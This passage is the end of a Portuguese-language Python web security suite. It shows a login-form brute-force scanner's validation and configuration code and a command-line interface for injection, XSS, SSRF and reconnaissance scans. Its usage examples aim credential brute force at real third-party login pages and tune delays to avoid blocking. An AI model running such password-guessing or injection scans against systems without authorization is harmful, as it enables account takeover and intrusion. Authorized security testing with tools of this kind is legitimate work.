        errors.append("Campo de senha (--pass-field) é obrigatório")
    
    # Validação de wordlist
    if not pass_wordlist_path:
        errors.append("Wordlist de senhas (-w/--wordlist) é obrigatória")
    elif not os.path.exists(pass_wordlist_path):
        errors.append(f"Arquivo de wordlist '{pass_wordlist_path}' não encontrado")
    elif os.path.getsize(pass_wordlist_path) == 0:
        errors.append(f"Arquivo de wordlist '{pass_wordlist_path}' está vazio")
    
    # Validação de strings de detecção
    if not failure_string and not success_string:
        errors.append("Pelo menos um de --failure-string ou --success-string deve ser fornecido")
    
    # Validação de modo de ataque e usuários
    if attack_mode == 'battering_ram':
        if not username:
            errors.append("Modo 'battering_ram' requer --username")
    elif attack_mode in ['pitchfork', 'cluster_bomb']:
        if not user_list_path:
            errors.append(f"Modo '{attack_mode}' requer --user-list")
        elif not os.path.exists(user_list_path):
            errors.append(f"Arquivo de usuários '{user_list_path}' não encontrado")
        elif os.path.getsize(user_list_path) == 0:
            errors.append(f"Arquivo de usuários '{user_list_path}' está vazio")
    
    # Validação de parâmetros numéricos
    if workers <= 0 or workers > 50:
        warnings.append(f"Número de workers ({workers}) fora do recomendado (1-50)")
    if delay < 0:
        errors.append("Delay não pode ser negativo")
    elif delay < 0.1:
        warnings.append(f"Delay muito baixo ({delay}s) pode causar rate limiting")
    if max_retries <= 0 or max_retries > 10:
        warnings.append(f"Max retries ({max_retries}) fora do recomendado (1-10)")
    if backoff_factor <= 1.0 or backoff_factor > 5.0:
        warnings.append(f"Backoff factor ({backoff_factor}) fora do recomendado (1.1-5.0)")
    if session_pool_size <= 0 or session_pool_size > 100:
        warnings.append(f"Session pool size ({session_pool_size}) fora do recomendado (1-100)")
    
    return errors, warnings

def print_brute_force_config(url, user_field, pass_field, username, user_list_path, pass_wordlist_path,
                             failure_string, success_string, workers, delay, attack_mode, max_retries,
                             backoff_factor, session_pool_size, enable_logging):
    """Exibe configuração detalhada do ataque de força bruta."""
    console.print("\n[bold cyan]═══ CONFIGURAÇÃO DO ATAQUE ═══[/bold cyan]")
    
    # Informações básicas
    config_table = Table(title="Parâmetros Principais", show_header=True, header_style="bold magenta")
    config_table.add_column("Parâmetro", style="cyan", width=20)
    config_table.add_column("Valor", style="yellow", width=40)
    config_table.add_column("Descrição", style="white", width=30)
    
    config_table.add_row("URL Alvo", url, "Página de login")
    config_table.add_row("Campo Usuário", user_field, "Nome do campo no HTML")
    config_table.add_row("Campo Senha", pass_field, "Nome do campo no HTML")
    config_table.add_row("Modo de Ataque", attack_mode, "Estratégia de teste")
    
    if attack_mode == 'battering_ram' and username:
        config_table.add_row("Usuário Fixo", username, "Usuário para testar")
    elif user_list_path:
        config_table.add_row("Lista Usuários", user_list_path, "Arquivo com usuários")
    
    config_table.add_row("Wordlist Senhas", pass_wordlist_path, "Arquivo com senhas")
    
    if failure_string:
        config_table.add_row("String Falha", failure_string, "Indica login falhado")
    if success_string:
        config_table.add_row("String Sucesso", success_string, "Indica login bem-sucedido")
    
    console.print(config_table)
    
    # Parâmetros avançados
    advanced_table = Table(title="Parâmetros Avançados", show_header=True, header_style="bold green")
    advanced_table.add_column("Parâmetro", style="cyan", width=20)
    advanced_table.add_column("Valor", style="yellow", width=15)
    advanced_table.add_column("Recomendação", style="white", width=35)
    
    advanced_table.add_row("Workers", str(workers), "1-5 para sites pequenos")
    advanced_table.add_row("Delay", f"{delay}s", "1.5-3.0s para evitar bloqueios")
    advanced_table.add_row("Max Retries", str(max_retries), "3-5 para conexões instáveis")
    advanced_table.add_row("Backoff Factor", str(backoff_factor), "1.5-3.0 para retry suave")
    advanced_table.add_row("Session Pool", str(session_pool_size), "5-20 para performance")
    advanced_table.add_row("Logging", "Ativado" if enable_logging else "Desativado", "Ative para debugging")
    
    console.print(advanced_table)
    
    # Estatísticas da wordlist
    try:
        with open(pass_wordlist_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        wordlist_info = Table(title="Informações da Wordlist", show_header=True, header_style="bold yellow")
        wordlist_info.add_column("Métrica", style="cyan")
        wordlist_info.add_column("Valor", style="yellow")
        
        wordlist_info.add_row("Total de Senhas", str(len(passwords)))
        if passwords:
            wordlist_info.add_row("Senha Mais Curta", str(min(len(p) for p in passwords)))
            wordlist_info.add_row("Senha Mais Longa", str(max(len(p) for p in passwords)))
            wordlist_info.add_row("Tamanho Médio", f"{sum(len(p) for p in passwords) / len(passwords):.1f}")
        
        console.print(wordlist_info)
    except Exception:
        pass
    
    # Informações de usuários
    if attack_mode == 'battering_ram' and username:
        total_combinations = len(passwords) if 'passwords' in locals() else 0
    elif user_list_path and os.path.exists(user_list_path):
        try:
            with open(user_list_path, 'r', errors='ignore') as f:
                users = [line.strip() for line in f if line.strip()]
            if attack_mode == 'cluster_bomb':
                total_combinations = len(users) * len(passwords) if 'passwords' in locals() else 0
            else:  # pitchfork
                total_combinations = min(len(users), len(passwords)) if 'passwords' in locals() else 0
        except Exception:
            total_combinations = 0
    else:
        total_combinations = 0
    
    if total_combinations > 0:
        estimated_time = (total_combinations * delay) / workers
        console.print(f"\n[bold white]Total de Combinações:[/bold white] [yellow]{total_combinations}[/yellow]")
        console.print(f"[bold white]Tempo Estimado:[/bold white] [yellow]{estimated_time:.1f}s ({estimated_time/60:.1f}min)[/yellow]")
    
    console.print("\n[bold red]⚠️  AVISO:[/bold red] [white]Use apenas em sistemas que você possui ou tem autorização explícita para testar[/white]")
    console.print("[bold cyan]═══════════════════════════════[/bold cyan]\n")

def brute_force_scan(url, user_field, pass_field, username, user_list_path, pass_wordlist_path,
                     failure_string, success_string, workers, delay, attack_mode, max_retries=3,
                     backoff_factor=2.0, session_pool_size=10, enable_logging=False):
    """Executa ataque de força bruta em formulários de login com capacidades aprimoradas e validações robustas."""
    
    # Valida argumentos
    errors, warnings = validate_brute_force_args(url, user_field, pass_field, username, user_list_path, 
                                                 pass_wordlist_path, failure_string, success_string, 
                                                 workers, delay, attack_mode, max_retries, 
                                                 backoff_factor, session_pool_size)
    
    # Exibe erros e para execução se houver
    if errors:
        console.print("\n[bold red]═══ ERROS DE VALIDAÇÃO ═══[/bold red]")
        for error in errors:
            console.print(f"[bold red]✗[/bold red] {error}")
        console.print("[bold red]═══════════════════════════[/bold red]")
        return
    
    # Exibe avisos se houver
    if warnings:
        console.print("\n[bold yellow]═══ AVISOS ═══[/bold yellow]")
        for warning in warnings:
            console.print(f"[bold yellow]⚠[/bold yellow] {warning}")
        console.print("[bold yellow]═════════════[/bold yellow]")
    
    # Exibe configuração detalhada
    print_brute_force_config(url, user_field, pass_field, username, user_list_path, pass_wordlist_path,
                            failure_string, success_string, workers, delay, attack_mode, max_retries,
                            backoff_factor, session_pool_size, enable_logging)
    
    # Confirmação do usuário para ataques grandes
    try:
        with open(pass_wordlist_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        if attack_mode == 'battering_ram':
            total_combinations = len(passwords)
        elif attack_mode == 'cluster_bomb' and user_list_path:
            with open(user_list_path, 'r', errors='ignore') as f:
                users_count = len([line.strip() for line in f if line.strip()])
            total_combinations = users_count * len(passwords)
        else:
            total_combinations = len(passwords)
        
        if total_combinations > 100:
            console.print(f"\n[bold yellow]⚠️  Ataque com {total_combinations} combinações pode ser detectado![/bold yellow]")
            response = input("Deseja continuar? (s/N): ").strip().lower()
            if response not in ['s', 'sim', 'y', 'yes']:
                console.print("[yellow]Ataque cancelado pelo usuário.[/yellow]")
                return
    except Exception:
        pass
    
    # Prepara lista de usuários baseada no modo de ataque
    users = []
    if attack_mode == 'battering_ram':
        users = [username]
    elif attack_mode in ['pitchfork', 'cluster_bomb']:
        try:
            with open(user_list_path, 'r', errors='ignore') as f:
                users = [line.strip() for line in f if line.strip()]
        except Exception as e:
            console.print(f"[bold red][!] Erro ao ler arquivo de usuários: {e}[/bold red]")
            return

    # Cria e executa scanner
    scanner = BruteForceScanner(url, user_field, pass_field, users, pass_wordlist_path,
                                failure_string, success_string, workers, delay, attack_mode)
    scanner.run_scan()

# --- INTERFACE DE LINHA DE COMANDO ---

def main():
    display_banner()
    
    parser = argparse.ArgumentParser(
        description="Spectra - Web Security Suite. Uma ferramenta para análise de segurança web.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Exemplos de Uso:
----------------

  [ Análise Completa ]
  # Executa uma análise completa, ignorando o cache de CVEs e gerando um relatório HTML
  python %(prog)s full-scan -u http://testphp.vulnweb.com/ --no-cache -o relatorio.html

  [ Scanning de Vulnerabilidades ]
  # Procura por falhas de SQL Injection com nível de agressividade 3 e focado em MySQL
  python %(prog)s sql-scan -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --level 3 --dbms mysql

  # Procura por falhas de XSS (Refletido e Armazenado) usando uma lista de payloads
  python %(prog)s xss-scan -u "http://testphp.vulnweb.com/guestbook.php" --custom-payloads payloads/xss.txt --scan-stored

  # Procura por CVEs para OpenSSL, ignorando o cache e filtrando por CVSS
  python %(prog)s cve-scan --product openssl --version 1.0.2 --min-cvss 7.0 --no-cache

  [ Scanner de Força Bruta (Refatorado) ]
  # Modo Battering Ram: um usuário contra múltiplas senhas
  python %(prog)s brute-force -u https://hackthissite.org/login --user-field "username" --pass-field "password" --username "admin" -w wordlist.txt --failure-string "Invalid username" --workers 3 --delay 1.5
  
  # Modo Cluster Bomb: múltiplos usuários contra múltiplas senhas
  python %(prog)s brute-force -u https://root-me.org/login --user-field "login" --pass-field "password" --user-list users.txt -w passwords.txt --attack-mode cluster_bomb --success-string "Welcome" --workers 2 --delay 2.0
  
  # Modo Pitchfork: testa pares de credenciais do arquivo (formato usuario:senha)
  python %(prog)s brute-force -u https://overthewire.org/login --user-field "username" --pass-field "password" --user-list credentials.txt --attack-mode pitchfork --failure-string "Access denied" --workers 1 --delay 3.0
  
  # Com opções avançadas: retry logic, session pooling e logging
  python %(prog)s brute-force -u https://example.com/login --user-field "user" --pass-field "pass" --username "admin" -w passwords.txt --max-retries 5 --backoff-factor 1.5 --session-pool-size 15 --enable-logging --workers 3 --delay 2.0

  [ Utilitários ]
  # Visualiza o conteúdo de um ficheiro online (ex: robots.txt)
  python %(prog)s view -u https://www.google.com/robots.txt

Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
"""
    )
    subparsers = parser.add_subparsers(dest='tool', title='Comandos Disponíveis', help='Descrição', required=True)

    # --- Grupo de Análise Completa ---
    parser_full = subparsers.add_parser('full-scan', help='[Completo] Executa todos os scans, incluindo CVEs, e gera um relatório.')
    parser_full.add_argument('-u', '--url', required=True, help='URL base para a análise completa.')
    parser_full.add_argument('-o', '--output', help='Ficheiro HTML para guardar o relatório (ex: relatorio.html).')
    parser_full.add_argument('--min-cvss', type=float, default=0.0, help='[CVE] Filtra CVEs com pontuação CVSS mínima (ex: 7.0).')
    parser_full.add_argument('--no-cache', action='store_true', help='[CVE] Ignora o cache local e força uma nova consulta à API.')
    
    # --- Grupo de Scanning de Vulnerabilidades ---
    parser_sql = subparsers.add_parser('sql-scan', help='[Scan] Procura por falhas de SQL Injection.')
    parser_sql.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
    parser_sql.add_argument('--level', type=int, default=1, choices=range(1, 6), help='Nível de agressividade do scan (1-5, padrão: 1).')
    parser_sql.add_argument('--dbms', help='Força o uso de payloads para um DBMS específico (ex: mysql, mssql, oracle).')

    parser_xss = subparsers.add_parser('xss-scan', help='[Scan] Procura por falhas de Cross-Site Scripting (XSS).')
    parser_xss.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
    parser_xss.add_argument('--custom-payloads', help='Caminho para um ficheiro com payloads de XSS personalizados (um por linha).')
    parser_xss.add_argument('--scan-stored', action='store_true', help='Ativa a verificação de XSS Armazenado (Stored).')
    parser_xss.add_argument('--fuzz-dom', action='store_true', help='Ativa a análise de XSS baseado em DOM (funcionalidade futura).')


    parser_cmd = subparsers.add_parser('cmd-scan', help='[Scan] Procura por falhas de Injeção de Comandos.')
    parser_cmd.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
    
    parser_lfi = subparsers.add_parser('lfi-scan', help='[Scan] Procura por falhas de Local File Inclusion (LFI).')
    parser_lfi.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')

    parser_ssrf = subparsers.add_parser('ssrf-scan', help='[Scan] Procura por falhas de Server-Side Request Forgery (SSRF).')
    parser_ssrf.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
    
    parser_redirect = subparsers.add_parser('open-redirect-scan', help='[Scan] Procura por falhas de Redirecionamento Aberto.')
    parser_redirect.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')

    parser_vuln = subparsers.add_parser('vuln-scan', help='[Scan] Executa uma verificação de configurações de segurança básicas.')
    parser_vuln.add_argument('-u', '--url', required=True, help='URL base do site para verificar.')

    parser_cve = subparsers.add_parser('cve-scan', help='[Scan] Procura por CVEs para um software e versão específicos.')
    parser_cve.add_argument('--product', required=True, help='Nome do produto (ex: apache, wordpress, openssl).')
    parser_cve.add_argument('--version', required=True, help='Versão do produto (ex: 2.4.41, 5.8.1).')
    parser_cve.add_argument('--min-cvss', type=float, default=0.0, help='Filtra resultados com uma pontuação CVSS mínima (ex: 7.0).')
    parser_cve.add_argument('--no-cache', action='store_true', help='Ignora o cache local e força uma nova consulta à API.')
    
    parser_brute = subparsers.add_parser('brute-force', help='[Scan] Scanner de força bruta para formulários de login (refatorado).')
    parser_brute.add_argument('-u', '--url', required=True, help='URL da página contendo o formulário de login.')
    parser_brute.add_argument('--user-field', required=True, help='Nome do campo de usuário no formulário (atributo "name").')
    parser_brute.add_argument('--pass-field', required=True, help='Nome do campo de senha no formulário (atributo "name").')
    parser_brute.add_argument('-w', '--wordlist', required=True, help='Caminho para o arquivo de wordlist de senhas.')
    parser_brute.add_argument('--username', help='Usuário específico para modo battering_ram (um usuário, múltiplas senhas).')
    parser_brute.add_argument('--user-list', help='Arquivo com lista de usuários para modos cluster_bomb e pitchfork.')
    parser_brute.add_argument('--failure-string', help='String que indica falha no login (ex: "Invalid credentials").')
    parser_brute.add_argument('--success-string', help='String que indica sucesso no login (ex: "Welcome"). Alternativa ao --failure-string.')
    parser_brute.add_argument('--workers', type=int, default=5, help='Número de threads concorrentes (padrão: 5, recomendado: 1-5).')
    parser_brute.add_argument('--delay', type=float, default=1.0, help='Delay em segundos entre requisições (padrão: 1.0, recomendado: 1.5-3.0).')
    parser_brute.add_argument('--attack-mode', default='battering_ram', choices=['battering_ram', 'pitchfork', 'cluster_bomb'], help='Modo: battering_ram (1 user), cluster_bomb (N users x N passwords), pitchfork (pares user:pass).')
    parser_brute.add_argument('--max-retries', type=int, default=3, help='Número máximo de tentativas por requisição (padrão: 3).')
    parser_brute.add_argument('--backoff-factor', type=float, default=2.0, help='Fator de backoff exponencial para retry (padrão: 2.0).')
    parser_brute.add_argument('--session-pool-size', type=int, default=10, help='Tamanho do pool de sessões HTTP (padrão: 10).')
    parser_brute.add_argument('--enable-logging', action='store_true', help='Habilita logging detalhado das operações.')


    # --- Grupo de Reconhecimento & Enumeração ---
    parser_scan = subparsers.add_parser('scan', help='[Recon] Escaneia portas abertas num alvo.')
    parser_scan.add_argument('-t', '--target', required=True, help='Host ou endereço IP do alvo.')
    parser_scan.add_argument('-p', '--ports', required=True, help="Portas para escanear (ex: '1-1024', '80,443', '22').")
    parser_scan.add_argument('--workers', type=int, default=100, help='Número de threads (padrão: 100).')
    parser_scan.add_argument('--grab-banner', action='store_true', help='Tenta capturar o banner do serviço.')

    parser_discover = subparsers.add_parser('discover', help='[Recon] Encontra diretórios e ficheiros num site.')
    parser_discover.add_argument('-u', '--url', required=True, help='URL base do site alvo.')
    parser_discover.add_argument('-w', '--wordlist', required=True, help='Caminho para o ficheiro da wordlist.')
    parser_discover.add_argument('--workers', type=int, default=30, help='Número de threads (padrão: 30).')
    parser_discover.add_argument('--recursive', action='store_true', help='Realizar uma varredura recursiva.')
    parser_discover.add_argument('--max-depth', type=int, default=2, help='Profundidade máxima para recursão (padrão: 2).')

    parser_subdomain = subparsers.add_parser('subdomain', help='[Recon] Encontra subdomínios de um domínio.')
    parser_subdomain.add_argument('-d', '--domain', required=True, help='O domínio alvo para escanear.')
    parser_subdomain.add_argument('-w', '--wordlist', required=True, help='Caminho para a wordlist de subdomínios.')
    parser_subdomain.add_argument('--workers', type=int, default=100, help='Número de threads (padrão: 100).')

    parser_dns = subparsers.add_parser('dns', help='[Recon] Consulta registros DNS de um domínio.')
    parser_dns.add_argument('-d', '--domain', required=True, help='O domínio para consultar.')
    parser_dns.add_argument('-t', '--type', default='ALL', help="Tipo de registro (A, MX, TXT, etc.) ou 'ALL' para os mais comuns.")

    parser_crawl = subparsers.add_parser('crawl', help='[Recon] Extrai todos os links e recursos de uma página web.')
    parser_crawl.add_argument('-u', '--url', required=True, help='URL inicial para o crawling.')
    parser_crawl.add_argument('--depth', type=int, default=1, help='Profundidade máxima do crawling (padrão: 1).')
    parser_crawl.add_argument('-o', '--output', help='Arquivo para salvar a lista de recursos encontrados.')

    parser_whois = subparsers.add_parser('whois', help='[Recon] Obtém informações de registo WHOIS de um domínio.')
    parser_whois.add_argument('-d', '--domain', required=True, help='Domínio para consultar o WHOIS.')

    parser_tech = subparsers.add_parser('tech-detect', help='[Recon] Deteta tecnologias web (servidor, framework, etc).')
    parser_tech.add_argument('-u', '--url', required=True, help='URL do site para analisar.')

    parser_waf = subparsers.add_parser('waf-detect', help='[Recon] Deteta a presença de um Web Application Firewall (WAF).')
    parser_waf.add_argument('-u', '--url', required=True, help='URL base do site para verificar.')

    # --- Grupo de Utilitários ---
    parser_grab = subparsers.add_parser('grab', help='[Util] Captura o banner de um serviço numa porta específica.')
    parser_grab.add_argument('-t', '--target', required=True, help='Host ou endereço IP do alvo.')
    parser_grab.add_argument('-p', '--port', required=True, type=int, help='Porta específica para capturar o banner.')

    parser_meta = subparsers.add_parser('meta', help='[Util] Extrai metadados EXIF de uma imagem a partir de um URL.')
    parser_meta.add_argument('-u', '--url', required=True, help='URL direto da imagem.')

    parser_headers = subparsers.add_parser('headers', help='[Util] Analisa os cabeçalhos de resposta HTTP de uma URL.')
    parser_headers.add_argument('-u', '--url', required=True, help='URL para analisar os cabeçalhos.')
    
    parser_ssl = subparsers.add_parser('ssl-info', help='[Util] Analisa o certificado SSL/TLS de um host.')
    parser_ssl.add_argument('-d', '--domain', required=True, help='Host para analisar o certificado (ex: google.com).')
    parser_ssl.add_argument('-p', '--port', type=int, default=443, help='Porta do serviço SSL/TLS (padrão: 443).')

    parser_view = subparsers.add_parser('view', help='[Util] Visualiza o conteúdo de um arquivo a partir de um URL.')
    parser_view.add_argument('-u', '--url', required=True, help='URL direto do arquivo para visualizar.')

    args = parser.parse_args()

    if args.tool == 'scan':
        scan_ports_threaded(args.target, args.ports, False, args.grab_banner, args.workers)
    elif args.tool == 'grab':
        grab_banner(args.target, args.port)
    elif args.tool == 'discover':
        all_found_paths = discover_directories(args.url, args.wordlist, workers=args.workers, recursive=args.recursive, max_depth=args.max_depth)
        if all_found_paths:
            console.print("-" * 60)
            table = Table(title="Relatório Final de Diretórios Encontrados")
            table.add_column("URL Encontrada", style="cyan", no_wrap=False)
            table.add_column("Status", justify="center", style="magenta")
            table.add_column("Observação", style="green")
            for url, status, location in sorted(all_found_paths, key=lambda x: x[1]):
                obs = f"Redireciona para: {location}" if location else ""
                table.add_row(url, str(status), obs)
            console.print(table)
        else:
            console.print("[bold yellow][-] Nenhum diretório ou ficheiro encontrado.[/bold yellow]")
    elif args.tool == 'meta':
        extract_metadata(args.url)
    elif args.tool == 'subdomain':
        discover_subdomains(args.domain, args.wordlist, args.workers)
    elif args.tool == 'dns':
        query_dns(args.domain, args.type)
    elif args.tool == 'crawl':
        crawl_links(args.url, args.depth, args.output)
    elif args.tool == 'whois':
        get_whois_info(args.domain)
    elif args.tool == 'headers':
        get_http_headers(args.url)
    elif args.tool == 'ssl-info':
        get_ssl_info(args.domain, args.port)
    elif args.tool == 'tech-detect':
        detect_technologies(args.url)
    elif args.tool == 'waf-detect':
        detect_waf(args.url)
    elif args.tool == 'vuln-scan':
        vuln_scan(args.url)
    elif args.tool == 'sql-scan':
        sql_injection_scan(args.url, args.level, args.dbms)
    elif args.tool == 'xss-scan':
        xss_scan(args.url, custom_payloads_file=args.custom_payloads, scan_stored=args.scan_stored, fuzz_dom=args.fuzz_dom)
    elif args.tool == 'cmd-scan':
        command_injection_scan(args.url)
    elif args.tool == 'lfi-scan':
        lfi_scan(args.url)
    elif args.tool == 'ssrf-scan':
        ssrf_scan(args.url)
    elif args.tool == 'open-redirect-scan':
        open_redirect_scan(args.url)
    elif args.tool == 'full-scan':
        full_scan(args.url, args.output, args.min_cvss, args.no_cache)
    elif args.tool == 'view':
        view_file_from_url(args.url)
    elif args.tool == 'cve-scan':
        cve_scan(args.product, args.version, args.min_cvss, args.no_cache)
    elif args.tool == 'brute-force':
        # Validação inicial rápida
        if not args.failure_string and not args.success_string:
            console.print("\n[bold red]✗ Erro:[/bold red] Pelo menos um de --failure-string ou --success-string deve ser fornecido.")
            console.print("[dim]Use --help para ver exemplos de uso.[/dim]\n")
            return
        
        # Validação de arquivos essenciais
        if not os.path.exists(args.wordlist):
            console.print(f"\n[bold red]✗ Erro:[/bold red] Arquivo de wordlist '{args.wordlist}' não encontrado.")
            console.print("[dim]Verifique o caminho do arquivo e tente novamente.[/dim]\n")
            return
        
        if args.attack_mode in ['pitchfork', 'cluster_bomb'] and args.user_list and not os.path.exists(args.user_list):
            console.print(f"\n[bold red]✗ Erro:[/bold red] Arquivo de usuários '{args.user_list}' não encontrado.")
            console.print("[dim]Verifique o caminho do arquivo e tente novamente.[/dim]\n")
            return
        
        brute_force_scan(args.url, args.user_field, args.pass_field, args.username, args.user_list, args.wordlist, 
                         args.failure_string, args.success_string, args.workers, args.delay, args.attack_mode,
                         args.max_retries, args.backoff_factor, args.session_pool_size, args.enable_logging)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
